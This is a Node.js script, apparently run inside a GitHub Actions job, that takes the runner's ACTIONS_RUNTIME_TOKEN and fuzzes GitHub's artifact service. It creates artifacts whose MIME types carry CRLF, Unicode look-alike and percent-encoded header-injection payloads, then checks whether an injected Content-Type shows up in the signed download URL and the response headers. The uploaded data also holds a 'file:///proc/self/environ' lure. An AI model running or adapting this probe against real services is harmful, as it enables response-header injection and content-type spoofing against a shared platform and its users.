'use strict';

const crypto = require('node:crypto');
const https = require('node:https');
const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = payload.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ workflow_run_backend_id: ctx.runId,
      workflow_job_run_backend_id: ctx.jobId, ...fields }),
    signal: AbortSignal.timeout(20000),
  });
  const text = await response.text();
  let body = {};
  try { body = JSON.parse(text); } catch { body = { raw: text.slice(0, 200) }; }
  return { status: response.status, body };
}

function value(result, field) {
  return result.body[field] || result.body[field.replace(/_([a-z])/g, (_, c) => c.toUpperCase())] || null;
}

function rawGet(url) {
  return new Promise((resolve) => {
    const req = https.get(url, { timeout: 20000 }, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(chunk));
      response.on('end', () => {
        const raw = [];
        for (let index = 0; index < response.rawHeaders.length; index += 2) {
          if (response.rawHeaders[index].toLowerCase() === 'content-type') {
            raw.push(Buffer.from(response.rawHeaders[index + 1], 'latin1').toString('hex'));
          }
        }
        resolve({ status: response.statusCode, contentTypesHex: raw,
          bodyLength: Buffer.concat(chunks).length });
      });
    });
    req.on('timeout', () => req.destroy(new Error('timeout')));
    req.on('error', (error) => resolve({ error: `${error.code || error.name}:${error.message}` }));
  });
}

async function one(ctx, index, label, mime) {
  const name = `mime-param-${index}-${Date.now()}.json`;
  const payload = Buffer.from(JSON.stringify({ full_name: 'mime/param',
    owner: { login: 'mime', avatar_url: 'file:///proc/self/environ' }, label }));
  const created = await rpc(ctx, 'CreateArtifact', { name, version: 7, mime_type: mime });
  const uploadUrl = value(created, 'signed_upload_url');
  const output = { label,
    codepoints: Array.from(mime, (c) => c.codePointAt(0).toString(16)).join(','),
    create: created.status,
    message: created.body.msg || created.body.message || created.body.code || '',
    accepted: Boolean(uploadUrl) };
  if (!uploadUrl) return output;
  const uploaded = await fetch(uploadUrl, { method: 'PUT',
    headers: { 'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob' },
    body: payload, signal: AbortSignal.timeout(20000) });
  output.upload = uploaded.status;
  const finalized = await rpc(ctx, 'FinalizeArtifact', { name, size: String(payload.length),
    hash: `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}` });
  output.finalize = finalized.status;
  const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
  const downloadUrl = value(signed, 'signed_url');
  output.signed = signed.status;
  if (downloadUrl) {
    const rsct = new URL(downloadUrl).searchParams.get('rsct');
    output.rsctCodepoints = Array.from(rsct || '', (c) => c.codePointAt(0).toString(16)).join(',');
    output.get = await rawGet(downloadUrl);
  }
  return output;
}

(async () => {
  const ctx = context();
  const cases = [
    ['ascii-param', 'application/octet-stream; charset=utf-8'],
    ['quoted-eacute', 'application/octet-stream; x="\u00e9"'],
    ['quoted-u0085', 'application/octet-stream; x="\u0085"'],
    ['quoted-u0185', 'application/octet-stream; x="\u0185"'],
    ['quoted-u010d', 'application/octet-stream; x="\u010d"'],
    ['quoted-u010a', 'application/octet-stream; x="\u010a"'],
    ['quoted-u013a', 'application/octet-stream; x="\u013a"'],
    ['quoted-split', 'application/octet-stream; x="\u010d\u010aContent-Type: \u0185application/json"'],
    ['quoted-percent-split', 'application/octet-stream; x="%0d%0aContent-Type:%20%C2%85application/json"'],
    ['extended-u0085', "application/octet-stream; x*=UTF-8''%C2%85"],
    ['token-percent-split', 'application/octet-stream; x=%0d%0aContent-Type%3a%C2%85application%2fjson'],
    ['json-quoted-u0185', 'application/json; x="\u0185"'],
    ['json-quoted-split', 'application/json; x="\u010d\u010aContent-Type: \u0185application/json"'],
  ];
  for (let index = 0; index < cases.length; index += 1) {
    try { console.log('PARAM ' + JSON.stringify(await one(ctx, index, ...cases[index]))); }
    catch (error) { console.log('PARAM ' + JSON.stringify({ label: cases[index][0],
      error: `${error.name}:${error.message}` })); }
  }
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
